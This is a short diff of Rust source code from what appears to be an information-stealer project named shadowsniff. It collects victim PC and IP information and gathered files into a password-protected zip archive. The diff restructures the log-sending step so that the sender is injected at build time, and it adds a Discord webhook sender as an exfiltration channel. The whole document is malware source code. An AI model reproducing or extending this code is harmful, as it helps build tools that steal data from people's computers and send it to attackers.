@@ -36,7 +36,8 @@ use filesystem::virtualfs::VirtualFileSystem;
 use ipinfo::{IpInfo, init, unwrapped_ip_info};
 use rand_chacha::ChaCha20Rng;
 use rand_core::RngCore;
-use sender::LogSenderExt;
+use sender::{LogSender, LogSenderExt};
+use sender::discord_webhook::DiscordWebhookSender;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::pc_info::PcInfo;
@@ -78,14 +79,14 @@ pub fn run() {
 
     include!(env!("BUILDER_CONSIDER_EMPTY_EXPR"));
 
-    let zip = ZipArchive::default()
+    let _zip = ZipArchive::default()
         .add_folder_content(&fs, out)
         .password(password)
         .comment(displayed_collector);
 
-    let sender = include!(env!("BUILDER_SENDER_EXPR"));
+    let _log_name = generate_log_name();
 
-    let _ = sender.send_archive(generate_log_name(), zip, &collector);
+    include!(env!("BUILDER_SENDER_EXPR"));
 
     #[cfg(feature = "message_box_after_execution")]
     include!(env!("BUILDER_MESSAGE_BOX_EXPR"));
